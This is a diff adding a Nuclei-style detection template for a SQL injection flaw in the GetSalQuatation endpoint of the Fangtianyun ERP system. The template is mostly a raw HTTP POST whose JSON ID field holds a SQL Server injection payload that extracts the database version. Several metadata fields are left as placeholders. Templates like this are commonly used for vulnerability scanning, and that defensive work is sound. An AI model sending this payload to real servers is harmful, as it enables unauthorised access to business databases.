@@ -1,0 +1,29 @@
+id: fty-AjaxMethods-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 方天云ERP系统GetSalQuatation存在SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /AjaxMethods.asmx/GetSalQuatation HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+        X-Requested-With: XMLHttpRequest
+        Connection: close
+        Content-Length: 172
+
+        {ID:"(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+(CASE WHEN (8725=8725) THEN @@VERSION ELSE CHAR(48) END)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))"}
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '500'
